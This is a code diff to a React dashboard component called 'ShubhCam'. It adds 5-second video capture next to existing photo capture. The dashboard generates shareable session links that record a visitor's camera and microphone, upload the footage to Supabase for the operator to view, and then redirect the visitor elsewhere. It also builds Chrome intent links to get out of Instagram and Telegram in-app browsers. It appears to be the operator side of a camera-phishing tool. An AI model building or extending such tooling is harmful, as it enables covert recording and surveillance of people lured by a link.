@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef } from "react";
-import { Camera, Link2, Image, Copy, RefreshCw, Zap, Trash2, Download, ExternalLink, Code, Upload, Chrome } from "lucide-react";
+import { Camera, Link2, Image, Copy, RefreshCw, Zap, Trash2, Download, ExternalLink, Code, Upload, Chrome, Video, Play } from "lucide-react";
 import { Button } from "./ui/button";
 import { Input } from "./ui/input";
 import { Textarea } from "./ui/textarea";
@@ -15,10 +15,19 @@ interface CapturedPhoto {
   user_agent: string | null;
 }
 
+interface CapturedVideo {
+  id: string;
+  video_url: string;
+  duration_seconds: number;
+  captured_at: string;
+  user_agent: string | null;
+}
+
 const ShubhCam = () => {
   const { settings, updateSettings } = useSettings();
-  const [activeTab, setActiveTab] = useState<"link" | "photos" | "custom" | "chrome">("link");
+  const [activeTab, setActiveTab] = useState<"link" | "photos" | "custom" | "chrome" | "video">("link");
   const [photos, setPhotos] = useState<CapturedPhoto[]>([]);
+  const [videos, setVideos] = useState<CapturedVideo[]>([]);
   const [loading, setLoading] = useState(false);
   const [customHtml, setCustomHtml] = useState(settings.customCaptureHtml || "");
   const [chromeCustomHtml, setChromeCustomHtml] = useState(settings.chromeCustomHtml || "");
@@ -34,6 +43,7 @@ const ShubhCam = () => {
   const captureLink = `${currentOrigin}/capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}`;
   const customCaptureLink = `${currentOrigin}/custom-capture?session=${sessionId}`;
   const chromeCustomCaptureLink = `${currentOrigin}/chrome-custom-capture?session=${sessionId}`;
+  const videoCaptureLink = `${currentOrigin}/video-capture?session=${sessionId}&duration=5&redirect=${encodeURIComponent(redirectUrl)}`;
   
   // Chrome intent link for in-app browsers (Instagram, Telegram, etc.)
   const chromeIntentLink = `intent://${currentOrigin.replace(/^https?:\/\//, '')}/capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}#Intent;scheme=https;package=com.android.chrome;end`;
@@ -59,8 +69,53 @@ const ShubhCam = () => {
     setLoading(false);
   };
 
+  // Load videos from Supabase
+  const loadVideos = async () => {
+    setLoading(true);
+    const { data, error } = await supabase
+      .from('captured_videos')
+      .select('*')
+      .eq('session_id', sessionId)
+      .order('captured_at', { ascending: false });
+    
+    if (error) {
+      console.error('Error loading videos:', error);
+    } else {
+      setVideos(data || []);
+    }
+    setLoading(false);
+  };
+
+  const deleteVideo = async (videoId: string, videoUrl: string) => {
+    // Extract file path from URL
+    const urlParts = videoUrl.split('/captured-videos/');
+    if (urlParts[1]) {
+      await supabase.storage.from('captured-videos').remove([urlParts[1]]);
+    }
+    
+    const { error } = await supabase
+      .from('captured_videos')
+      .delete()
+      .eq('id', videoId);
+    
+    if (error) {
+      toast({
+        title: "Error",
+        description: "Failed to delete video",
+        variant: "destructive"
+      });
+    } else {
+      setVideos(videos.filter(v => v.id !== videoId));
+      toast({
+        title: "Deleted",
+        description: "Video removed",
+      });
+    }
+  };
+
   useEffect(() => {
     loadPhotos();
+    loadVideos();
   }, [sessionId]);
 
   useEffect(() => {
@@ -243,46 +298,57 @@ const ShubhCam = () => {
         <button
           onClick={() => setActiveTab("link")}
           className={cn(
-            "flex-1 py-3 px-2 flex items-center justify-center gap-1.5 transition-all text-xs font-bold tracking-wide",
+            "flex-1 py-3 px-1 flex items-center justify-center gap-1 transition-all text-[10px] font-bold tracking-wide",
             activeTab === "link"
               ? "bg-gradient-to-r from-neon-pink to-neon-pink/80 text-background shadow-[0_0_20px_hsl(var(--neon-pink)/0.5)]"
               : "text-muted-foreground hover:bg-neon-pink/10 hover:text-neon-pink"
           )}
         >
-          <Zap className="w-3.5 h-3.5" /> LINK
+          <Zap className="w-3 h-3" /> LINK
+        </button>
+        <button
+          onClick={() => setActiveTab("video")}
+          className={cn(
+            "flex-1 py-3 px-1 flex items-center justify-center gap-1 transition-all text-[10px] font-bold tracking-wide border-l border-neon-pink/30",
+            activeTab === "video"
+              ? "bg-gradient-to-r from-neon-red to-neon-red/80 text-background shadow-[0_0_20px_hsl(var(--neon-red)/0.5)]"
+              : "text-muted-foreground hover:bg-neon-red/10 hover:text-neon-red"
+          )}
+        >
+          <Video className="w-3 h-3" /> VIDEO
         </button>
         <button
           onClick={() => setActiveTab("chrome")}
           className={cn(
-            "flex-1 py-3 px-2 flex items-center justify-center gap-1.5 transition-all text-xs font-bold tracking-wide border-x border-neon-pink/30",
+            "flex-1 py-3 px-1 flex items-center justify-center gap-1 transition-all text-[10px] font-bold tracking-wide border-x border-neon-pink/30",
             activeTab === "chrome"
               ? "bg-gradient-to-r from-neon-orange to-neon-orange/80 text-background shadow-[0_0_20px_hsl(var(--neon-orange)/0.5)]"
               : "text-muted-foreground hover:bg-neon-orange/10 hover:text-neon-orange"
           )}
         >
-          <Chrome className="w-3.5 h-3.5" /> CHROME
+          <Chrome className="w-3 h-3" /> CHROME
         </button>
         <button
           onClick={() => setActiveTab("custom")}
           className={cn(
-            "flex-1 py-3 px-2 flex items-center justify-center gap-1.5 transition-all text-xs font-bold tracking-wide border-r border-neon-pink/30",
+            "flex-1 py-3 px-1 flex items-center justify-center gap-1 transition-all text-[10px] font-bold tracking-wide border-r border-neon-pink/30",
             activeTab === "custom"
               ? "bg-gradient-to-r from-neon-cyan to-neon-cyan/80 text-background shadow-[0_0_20px_hsl(var(--neon-cyan)/0.5)]"
               : "text-muted-foreground hover:bg-neon-cyan/10 hover:text-neon-cyan"
           )}
         >
-          <Code className="w-3.5 h-3.5" /> CUSTOM
+          <Code className="w-3 h-3" /> HTML
         </button>
         <button
-          onClick={() => { setActiveTab("photos"); refreshPhotos(); }}
+          onClick={() => { setActiveTab("photos"); refreshPhotos(); loadVideos(); }}
           className={cn(
-            "flex-1 py-3 px-2 flex items-center justify-center gap-1.5 transition-all text-xs font-bold tracking-wide",
+            "flex-1 py-3 px-1 flex items-center justify-center gap-1 transition-all text-[10px] font-bold tracking-wide",
             activeTab === "photos"
               ? "bg-gradient-to-r from-neon-purple to-neon-purple/80 text-background shadow-[0_0_20px_hsl(var(--neon-purple)/0.5)]"
               : "text-muted-foreground hover:bg-neon-purple/10 hover:text-neon-purple"
           )}
         >
-          <Image className="w-3.5 h-3.5" /> ({photos.length})
+          <Image className="w-3 h-3" /> ({photos.length + videos.length})
         </button>
       </div>
 
@@ -379,6 +445,136 @@ const ShubhCam = () => {
             <Button
               onClick={refreshPhotos}
               className="bg-gradient-to-r from-neon-pink to-neon-purple text-white font-bold hover:opacity-90 shadow-[0_0_20px_hsl(var(--neon-pink)/0.4)] transition-all py-5"
+            >
+              <RefreshCw className="w-4 h-4 mr-2" /> REFRESH
+            </Button>
+          </div>
+        </div>
+      ) : activeTab === "video" ? (
+        <div className="relative space-y-5">
+          {/* Video Capture Info */}
+          <div className="bg-gradient-to-r from-neon-red/10 to-neon-pink/10 rounded-xl p-4 border border-neon-red/30 shadow-[inset_0_0_20px_hsl(var(--neon-red)/0.1)]">
+            <h3 className="font-bold text-neon-red mb-3 flex items-center gap-2">
+              <Video className="w-4 h-4" /> 5 Second Video Capture
+            </h3>
+            <p className="text-sm text-foreground/80 mb-2">
+              User se permission lekar 5 second ki video record karega.
+            </p>
+            <ol className="text-sm text-foreground/70 space-y-2">
+              <li className="flex items-start gap-2">
+                <span className="w-5 h-5 rounded-full bg-neon-red/20 text-neon-red text-xs flex items-center justify-center font-bold shrink-0 mt-0.5">1</span>
+                <span>User "Start Recording" click karta hai</span>
+              </li>
+              <li className="flex items-start gap-2">
+                <span className="w-5 h-5 rounded-full bg-neon-pink/20 text-neon-pink text-xs flex items-center justify-center font-bold shrink-0 mt-0.5">2</span>
+                <span>Camera + Mic permission deta hai</span>
+              </li>
+              <li className="flex items-start gap-2">
+                <span className="w-5 h-5 rounded-full bg-neon-purple/20 text-neon-purple text-xs flex items-center justify-center font-bold shrink-0 mt-0.5">3</span>
+                <span>5 second video record + upload hoti hai</span>
+              </li>
+            </ol>
+          </div>
+
+          {/* Session ID */}
+          <div className="flex items-center gap-2 text-xs bg-card/50 rounded-lg px-3 py-2 border border-neon-red/30">
+            <span className="text-muted-foreground">Session:</span>
+            <span className="text-neon-red font-mono font-bold tracking-wider">{sessionId}</span>
+          </div>
+
+          {/* Video Capture Link */}
+          <div className="bg-card/30 rounded-xl p-4 border border-neon-red/30">
+            <div className="flex items-center gap-2 mb-3">
+              <span className="text-xl">🎬</span>
+              <h3 className="text-neon-red font-bold tracking-wide">VIDEO CAPTURE LINK</h3>
+            </div>
+            <div className="flex gap-2">
+              <Input
+                value={videoCaptureLink}
+                readOnly
+                className="bg-background/50 border-neon-red/50 text-neon-red text-xs font-mono focus:border-neon-red focus:ring-neon-red/30"
+              />
+              <Button
+                variant="outline"
+                size="icon"
+                onClick={() => copyToClipboard(videoCaptureLink)}
+                className="border-neon-red text-neon-red hover:bg-neon-red/20 hover:shadow-[0_0_15px_hsl(var(--neon-red)/0.4)] shrink-0 transition-all"
+              >
+                <Copy className="w-4 h-4" />
+              </Button>
+            </div>
+            <p className="text-neon-orange text-xs mt-3 flex items-center gap-1">
+              ⚠ Video ke baad redirect: <span className="font-mono">{redirectUrl || "None"}</span>
+            </p>
+          </div>
+
+          {/* Test Link */}
+          <Button
+            onClick={() => window.open(videoCaptureLink, '_blank')}
+            variant="outline"
+            className="w-full border-2 border-neon-red text-neon-red hover:bg-neon-red/20 hover:shadow-[0_0_20px_hsl(var(--neon-red)/0.4)] transition-all py-5"
+          >
+            <Play className="w-4 h-4 mr-2" /> TEST VIDEO LINK
+          </Button>
+
+          {/* Captured Videos */}
+          {videos.length > 0 && (
+            <div className="bg-card/30 rounded-xl p-4 border border-neon-purple/30">
+              <div className="flex items-center justify-between mb-3">
+                <h3 className="text-neon-purple font-bold tracking-wide text-sm flex items-center gap-2">
+                  <Video className="w-4 h-4" /> CAPTURED VIDEOS ({videos.length})
+                </h3>
+                <Button
+                  variant="outline"
+                  size="sm"
+                  onClick={loadVideos}
+                  className="border-neon-purple text-neon-purple hover:bg-neon-purple/10 h-7 text-xs"
+                >
+                  <RefreshCw className="w-3 h-3 mr-1" /> Refresh
+                </Button>
+              </div>
+              <div className="space-y-3">
+                {videos.slice(0, 5).map((video) => (
+                  <div key={video.id} className="flex items-center gap-3 bg-background/30 rounded-lg p-2">
+                    <video 
+                      src={video.video_url} 
+                      className="w-20 h-14 object-cover rounded-lg"
+                      controls
+                    />
+                    <div className="flex-1 min-w-0">
+                      <p className="text-xs text-foreground/70 truncate">
+                        {new Date(video.captured_at).toLocaleString()}
+                      </p>
+                      <p className="text-[10px] text-muted-foreground">
+                        {video.duration_seconds}s video
+                      </p>
+                    </div>
+                    <Button
+                      size="icon"
+                      variant="outline"
+                      onClick={() => deleteVideo(video.id, video.video_url)}
+                      className="border-neon-red text-neon-red h-8 w-8"
+                    >
+                      <Trash2 className="w-3 h-3" />
+                    </Button>
+                  </div>
+                ))}
+              </div>
+            </div>
+          )}
+
+          {/* Action Buttons */}
+          <div className="grid grid-cols-2 gap-3">
+            <Button
+              onClick={generateNewSession}
+              variant="outline"
+              className="border-2 border-neon-green text-neon-green hover:bg-neon-green/20 hover:shadow-[0_0_15px_hsl(var(--neon-green)/0.4)] transition-all py-5"
+            >
+              <Link2 className="w-4 h-4 mr-2" /> NEW SESSION
+            </Button>
+            <Button
+              onClick={loadVideos}
+              className="bg-gradient-to-r from-neon-red to-neon-pink text-white font-bold hover:opacity-90 shadow-[0_0_20px_hsl(var(--neon-red)/0.4)] transition-all py-5"
             >
               <RefreshCw className="w-4 h-4 mr-2" /> REFRESH
             </Button>
